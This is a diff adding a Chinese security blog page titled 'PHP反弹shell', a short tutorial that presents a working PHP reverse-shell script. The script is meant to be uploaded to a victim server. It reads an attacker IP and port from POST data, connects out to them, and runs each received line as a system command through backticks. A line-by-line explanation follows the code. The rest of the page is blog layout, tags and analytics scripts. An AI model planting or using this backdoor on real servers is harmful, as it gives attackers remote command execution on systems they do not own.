@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    
+    <title>PHP反弹shell | MyBlogs</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+      <meta name="google-site-verification" content="XXX" />
+    
+
+    
+
+    
+
+    
+
+    
+        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎮</text></svg>">
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1637200696663.css">
+
+
+    
+<link rel="stylesheet" href="/dist/custom.css?v=1637200696663.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            
+        }
+        window.aomori_logo_typed_animated = true
+        window.aomori_search_algolia = false
+
+    </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-avatar avatar avatar-sm">
+                <img src="/images/avatar.jpg" alt="">
+            </div>
+            
+            <div class="header-type-inner">
+                
+                    <div id="typed-strings" style="display:none">
+                        <p>MyBlogs</p>
+                    </div>
+                    <a class="header-type-title" id="typed" href="/"></a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">Home</a>
+                
+                <a href="/archives">Archives</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+    <a class="social" target="_blank" href="">
+        <box-icon type='' name=''></box-icon>
+    </a>
+
+    <a class="social" target="_blank" href="">
+        <box-icon type='' name=''></box-icon>
+    </a>
+
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">Home</a>
+                    
+                    <a href="/archives">Archives</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-ckw68hqsw001ejs4zdpxu1rw1" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      PHP反弹shell
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2019-09-26T10:46:27.000Z" itemprop="datePublished">2019-09-26</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li></ul>
+            </div>
+            
+
+            
+            <div class="article-busuanzi">
+                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+            </div>
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <p><strong>步骤详解：</strong><br>前提：<br>①、PHPStudy开启相关服务。<br>②、假设木马已上传至服务器且可以访问（即执行代码才能反弹shell）。<br>③、攻击机器和受害服务器要处于同一网段。</p>
+<span id="more"></span>
+
+<p>1、划线为攻击机的IP+端口。<br><img src="https://img-blog.csdnimg.cn/20190926184123526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2、攻击机监听自身端口4444，即可获取执行shell。<br><img src="https://img-blog.csdnimg.cn/20190926184410575.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0); </span><br><span class="line">$ip=$_POST[&#x27;ip&#x27;];</span><br><span class="line">$port=$_POST[&#x27;port&#x27;];</span><br><span class="line">$fp=@fsockopen($ip,$port,$errno,$errstr);</span><br><span class="line">if(!$fp)&#123;echo &quot;error&quot;;&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	fputs($fp,&quot;\n+++++++++++++connect sucess+++++++++\n&quot;);</span><br><span class="line">	while(!feof($fp))&#123;</span><br><span class="line">	fputs($fp,&quot;shell:&quot;);</span><br><span class="line">	$shell=fgets($fp);</span><br><span class="line">	$message=`$shell`;</span><br><span class="line">	fputs($fp,$message);</span><br><span class="line">	&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>代码注释：</strong><br>1、<code>set_time_limit()</code>来控制运行时间。如 <code>set_time_limit(800)</code>  ,其中将秒数如果设为0 ，表示持续运行到程序结束。<br>2、<code>$_POST[&#39;ip&#39;]</code> <code>$_POST[&#39;port&#39;]</code>表示传递的攻击的IP，PORT。<br>3、<code>$fp=@fsockopen($ip,$port,$errno,$errstr);</code> fsockopen — 打开一个网络连接或者一个Unix套接字连接，并且使用<code>@</code>屏蔽报错信息，返回一个文件句柄<code>$fp</code>，可以被其他文件类函数调用，例如代码中的<code>fputs(),fgets()</code>。<br>4、判断<code>$fp</code>是否存在，不存在报错<code>echo &quot;error&quot;</code>，存在就使用<code>fputs()</code>函数写入连接成功信息。<br>5、<code>feof()</code> 函数检查是否已到达文件末尾（EOF）。如果出错或者文件指针到了文件末尾（EOF）则返回 TRUE，否则返回 FALSE。使用while在不到读取的文件末尾时一直执行。<br>6、<code>fputs($fp,&quot;shell:&quot;);</code>向句柄输出shell:的提示<br>7、<code>$shell=fgets($fp);</code>将攻击机输入命令通过文件句柄<code>$fp</code>传递入受害机器，同时使用<code>fget()</code>函数读取输入的命令，最终传递给<code>$shell</code>变量存储。<br>8、<code>$message=`$shell`;</code>php默认将反单引号的内容作为系统命令执行。<br>9、<code>fputs($fp,$message);</code>将结果输出至攻击机端显示。<br>10、<code>fclose($fp);</code>关闭文件句柄。</p>
+
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+
+    
+<div class="article-copyright hairline">
+  <p>
+    本作品采用 <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a> 进行许可。
+  </p>
+</div>
+
+
+    
+
+    
+<nav class="article-nav">
+  
+    <a href="/2019/11/13/ICMP%E9%9A%A7%E9%81%93%E5%AD%A6%E4%B9%A0%EF%BC%88ptunnel%E5%AD%A6%E4%B9%A0%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-caption">下一篇</div>
+      <div class="article-nav-title">
+        
+          ICMP隧道学习（ptunnel学习）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/09/26/Linux%E5%8F%8D%E5%BC%B9shell/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">Linux反弹shell</div>
+    </a>
+  
+</nav>
+
+
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=PHP反弹shell - MyBlogs&url=http://example.com/2019/09/26/PHP%E5%8F%8D%E5%BC%B9shell/">
+            <box-icon type='logo' name='twitter'></box-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=PHP反弹shell - MyBlogs&u=http://example.com/2019/09/26/PHP%E5%8F%8D%E5%BC%B9shell/">
+            <box-icon name='facebook-square' type='logo' ></box-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=PHP反弹shell - MyBlogs&url=http://example.com/2019/09/26/PHP%E5%8F%8D%E5%BC%B9shell/&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+</article>
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+</div>
+                </section>
+            </section>
+
+            
+            <aside class="sidebar ">
+                
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BF%90%E7%BB%B4/">运维</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Access/" rel="tag">Access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cap-Pwd/" rel="tag">Cap_Pwd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/" rel="tag">Oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pth/" rel="tag">Pth</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VulLab/" rel="tag">VulLab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xff/" rel="tag">Xff</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/2021/11/18/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/15/%E5%8F%8D%E5%88%B6Goby%E6%89%AB%E6%8F%8F%E4%B9%8BXSS%E7%82%B9%E5%87%BB%E4%B8%8A%E7%BA%BF/">反制Goby扫描之XSS点击上线</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/11/docx%E6%89%B9%E9%87%8F%E8%BD%ACmarkdown%E8%84%9A%E6%9C%AC%E5%88%86%E4%BA%AB/">docx批量转markdown脚本分享</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/02/CS%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E8%B7%B5/">CS分离免杀实践</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/17/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86-%E6%B3%A8%E5%85%A5%E7%B1%BB-1-SQL%E6%B3%A8%E5%85%A5-Oracle/">渗透测试知识梳理-注入类-1-SQL注入-Oracle</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            MyBlogs &copy; 2021<br>
+            Powered By Hexo · Theme By <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Aomori</a>
+        </div>
+    </div>
+
+</footer>
+
+
+
+
+
+
+<script src="/dist/build.js?1637200696663.js"></script>
+
+
+<script src="/dist/custom.js?1637200696663.js"></script>
+
+
+
+<!-- 百度链接提交 -->
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+<!-- Google Analytics-->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXXXX-X"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'UA-XXXXX-X');
+</script>
+
+
+
+
+
+</body>
+
+</html>
